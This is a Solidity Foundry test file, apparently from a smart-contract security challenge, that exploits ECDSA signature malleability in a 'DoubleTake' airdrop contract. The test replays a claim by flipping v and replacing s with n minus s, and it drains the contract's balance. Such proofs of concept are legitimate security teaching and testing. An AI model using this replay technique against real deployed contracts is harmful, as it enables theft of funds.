// SPDX-License-Identifier: MIT

import {Test, console} from "forge-std/Test.sol";
import {DoubleTake} from "../src/DoubleTake.sol";

pragma solidity ^0.8.0;

contract DoubleTakeTest is Test {
    DoubleTake doubleTake;

    address public victim = makeAddr("victim");
    address public attacker = makeAddr("attacker");

    address public receiver = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8;

    uint8 v = 28;
    bytes32 r = 0xf202ed96ca1d80f41e7c9bbe7324f8d52b03a2c86d9b731a1d99aa018e9d77e7;
    bytes32 s = 0x7477cb98813d501157156e965b7ea359f5e6c108789e70d7d6873e3354b95f69;

    function setUp() public {
        hoax(victim, 10 ether);
        doubleTake = new DoubleTake{value: 2 ether}();
        vm.deal(attacker, 1 ether);

        vm.prank(attacker);
        doubleTake.claimAirdrop(receiver, 1 ether, v, r, s);
    }

    function testDoubleTake() public {
        // signature malleability
        uint8 newV = 27;
        uint256 n = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141;
        uint256 newS = n - uint256(s);
        vm.prank(attacker);
        doubleTake.claimAirdrop(receiver, 1 ether, newV, r, bytes32(newS));
        assertEq(address(doubleTake).balance, 0);
    }
}
